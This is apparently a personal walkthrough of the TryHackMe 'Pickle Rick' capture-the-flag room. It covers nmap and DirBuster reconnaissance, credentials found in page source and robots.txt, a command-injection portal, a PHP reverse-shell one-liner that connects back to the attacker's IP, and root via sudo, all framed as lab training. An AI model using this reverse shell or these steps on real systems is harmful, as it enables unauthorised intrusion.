## Introduction

Today I will be detailing my journey into breaking into the Pickle Rick machine from TryHackMe.com

Before reading my breakdown, I highly recommend you attempt it for yourself here: [Pickle Rick](https://tryhackme.com/room/picklerick)
With that out of the way, let's get started.

## Reconnaissance

The very first thing one should do when starting a new challenge room is an nmap scan of the app so we can start figuring out some attack vectors.

I performed a simple nmap scan with the following command:

```bash
sudo nmap -sS TARGET


```
My initial scan revealed two open ports:

|PORT   |STATE |SERVICE |
|-------|------|--------|
|22/tcp | open | ssh    |
|80/tcp | open | http   |

Since we have an open http port and the challenge itself did mention exploiting a web server, it seemed like the next logical step would be to plug the IP address into a web browser to see if we can figure out some attack vectors from the website.

At first glance nothing is really going on in this server, but after taking a look at the source code, we can find a single username.

```html
<!DOCTYPE html>
<html>
    <head>...</head>
    <body>
        <div class="container" >...</div>
        <!--
            Note to self, remember username!
            Username: R1ckRul3s
          -->
    </body>
</html>
```

Ok! We have our username!

:::callout{.blue}
At this point in the reconnaissance, I figured I could try to SSH into the machine with the username by brute-forcing the password.
This did not work, but it did send me into a "learning-how-SSH-works" rabbit hole that lasted a full day.
:::

Now we have run out of things to explore with what we know of the machine, so it's time to do some more reconnaissance.

This time, we will use DirBuster to enumerate all pages in the web app.

:::callout{.red}
Here I made the mistake of not really understanding how BirBuster worked, and not taking the time to google a good way to use it, resulting in me
missing some very important directories (namely login.php)
I ended up finding it after just copying a tutorial on DirBuster off YouTube.
:::

The DirBuster program returns a good amount of directories, but most give a forbidden 403 response. These are the ones that didn't

- /assets
- /assets/bootsrap.min.js
- /denied.php
- /index.html
- /login.php
- /portal.php
- /robots.txt
- /icons/small

After visiting each and every one, these were the interesting ones:
- /login.php (Contains a login form where we can plug in our credentials)
- /robots.txt (Contains a string that is likely to be a password)

This is starting to get interesting!

## Exploitation

So we have a username: R1ckRul3s.
And a password: Wubbalubbadubdub.

Great, once we plug them in on /login.php, we are sent to /portal.php, where we can input commands.

After experimenting a bit with the commands, two things became apparent.
1. One of the flags is right there! (ls)
2. The most useful commands don't work! (cat ingredient.txt)

Here is where having some good resources becomes incredibly helpful. In order to solve this challenge, I just visited my favorite [reverse shell cheat sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/) and stole a command.
The command that got me my shell was

```shell
php -r '$sock=fsockopen("MY_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
If you're going to grab it, just replace MY_IP with, well, your IP.

After getting the first flag and exploring a bit inside the machine, I managed to find the second flag.
But at this point I explored every inch of the machine I __had access to__, and I still couldn't find the third flag.
We need to go deeper.

## Going deeper (privilege escalation)

This time, privilege escalation was a bit of a joke. All I did was `ls /bin` and I compared each binary with [the GTFOBins repository](https://gtfobins.github.io/) to find one that let me escalate into root. It didn't take long.

The command that got me root ended up being
```bash
sudo bash
```
After that I found the third flag inside /root, beating the machine.

## Conclusion
This was a pretty fun, beginner-friendly challenge that let me practice my skills while always making the intended path quite obvious. Definitely recommend.
